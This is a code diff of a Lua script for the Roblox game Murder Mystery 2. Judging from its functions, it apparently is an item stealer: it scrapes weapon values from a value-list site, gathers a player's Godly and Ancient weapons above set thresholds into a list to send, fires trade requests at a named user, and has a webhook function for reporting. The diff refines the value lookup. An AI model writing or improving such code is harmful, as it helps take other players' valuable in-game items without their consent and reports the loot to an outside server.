@@ -42,18 +42,13 @@ local function SendWebhook(title, description, fields, prefix, image)
     end)
 end
 
--- Función para obtener valores de armas (sistema original)
+-- Función para obtener valores de armas (Godly y Ancient)
 local function buildValueList()
     local valueList = {}
-    local database = require(game.ReplicatedStorage.Database.Sync.Item)
     local categories = {
         godly = "https://supremevaluelist.com/mm2/godlies.html",
-        ancient = "https://supremevaluelist.com/mm2/ancients.html",
-        unique = "https://supremevaluelist.com/mm2/uniques.html",
-        classic = "https://supremevaluelist.com/mm2/vintages.html",
-        chroma = "https://supremevaluelist.com/mm2/chromas.html"
+        ancient = "https://supremevaluelist.com/mm2/ancients.html"
     }
-
     local headers = {
         ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*",
         ["User-Agent"] = "Mozilla/5.0"
@@ -86,7 +81,6 @@ local function buildValueList()
             end
         end
     end
-
     return valueList
 end
 
@@ -105,7 +99,6 @@ end
 
 -- Funciones de trade
 local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
-
 local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
 local function sendTradeRequest(user)
     local plrObj = Players:FindFirstChild(user)
@@ -130,7 +123,8 @@ for id, amount in pairs(profile.Weapons.Owned) do
         local rarityIndex = table.find(rarityTable, item.Rarity)
         local minIndex = table.find(rarityTable, min_rarity)
         if rarityIndex and rarityIndex >= minIndex then
-            local value = valueList[item.ItemName:lower()] or 1
+            local nameKey = (item.ItemName or item.Name or tostring(id)):lower()
+            local value = valueList[nameKey] or 1
             if value >= min_value then
                 table.insert(weaponsToSend,{DataID=id, Amount=amount, Value=value, Rarity=item.Rarity})
                 totalValue += value * amount
